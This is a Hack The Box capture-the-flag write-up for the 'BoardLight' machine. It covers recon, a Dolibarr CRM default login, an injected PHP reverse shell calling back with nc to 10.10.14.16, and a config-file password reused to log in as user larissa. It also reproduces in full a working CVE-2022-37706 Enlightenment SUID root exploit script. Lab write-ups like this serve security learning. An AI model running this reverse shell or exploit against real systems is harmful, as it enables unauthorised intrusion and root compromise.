# HTB BoardLight Write-up

We begin with an Nmap scan to enumerate open ports and services.

### Initial Reconnaissance

# Command :

```
nmap -p- -sVC -vv 10.10.11.11 -oN namap_Scan --min-rate=5000
```


| Port                                         | Port Info          |        Version     |
|-----------------------------------------------|----------------------------| ---------|
|   22      | SSH |     OpenSSH 8.2p1    |
| 80         | HTTP |       Apache httpd 2.4.41       |

# Web Directory Enumeration

### Command:
```
gobuster dir -u http://10.10.11.11 -w /usr/share/wordlists/dirb/common.txt 
```

<img width="708" height="439" alt="image" src="https://github.com/user-attachments/assets/3d9a495b-af6c-40f7-834a-97202fa0aa04" />

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://board.htb/ -H "Host: FUZZ.board.htb" -fw 6243
```


<img width="1249" height="451" alt="image" src="https://github.com/user-attachments/assets/e0ad4a59-2e48-4bb1-998c-a857759d5dfd" />


### On the 'crm.board.htb' we find a loggin page who we can loggin with `admin:admin` . After loggin on the `Websites` we will create a empty website and page .

<img width="1917" height="962" alt="image" src="https://github.com/user-attachments/assets/06f866c7-b9c8-49df-a493-6340091cfcd3" />

### After the creation of the page we will go to the ` Edit HTML Source ` and we will inject a php shell

```
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.16 1337 >/tmp/f");?>
```

<img width="1918" height="263" alt="image" src="https://github.com/user-attachments/assets/91d48e64-5fbf-400f-ac27-0c65a3bed551" />

## We will open and get a shell


<img width="1913" height="383" alt="image" src="https://github.com/user-attachments/assets/0b4b1d0a-ce1c-476a-a69c-bf6427f625ef" />

<img width="706" height="169" alt="image" src="https://github.com/user-attachments/assets/6fc9f9e3-b3b9-427f-b8af-3f560a912597" />


## We check config where we will find a username and a password 

```
/var/www/html/crm.board.htb/htdocs/conf
```

<img width="983" height="581" alt="image" src="https://github.com/user-attachments/assets/7baa1a0f-b3e1-4b40-aabc-2c58e445a644" />

```
dolibarrowner:serverfun2$2023!!
```

## I try to swich user to the dolibarrowner but this user dose not exist . On the `/home` directory we find `larissa` if we try this password on her we will loggin as her and get the user flag

<img width="495" height="164" alt="image" src="https://github.com/user-attachments/assets/d2181075-9ab2-4cfe-b3d8-f132a05e00b2" />

# Privilage Escalation

## I upload `linpeas.sh` on the machine and find the `enlightenment`

<img width="1309" height="268" alt="image" src="https://github.com/user-attachments/assets/4ee23632-fe8f-4d5a-955c-4944b2834551" />

### If we search exploit for enlightenment 0.23.1 we will find this exploit 


<img width="521" height="220" alt="image" src="https://github.com/user-attachments/assets/ee7c0403-6af1-46c9-8363-1b1cebb956ca" />

```
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

## If we make a file and put on the machine we will get the root

<img width="1582" height="513" alt="image" src="https://github.com/user-attachments/assets/6f053b72-6142-4e81-bb9f-11587071d86a" />






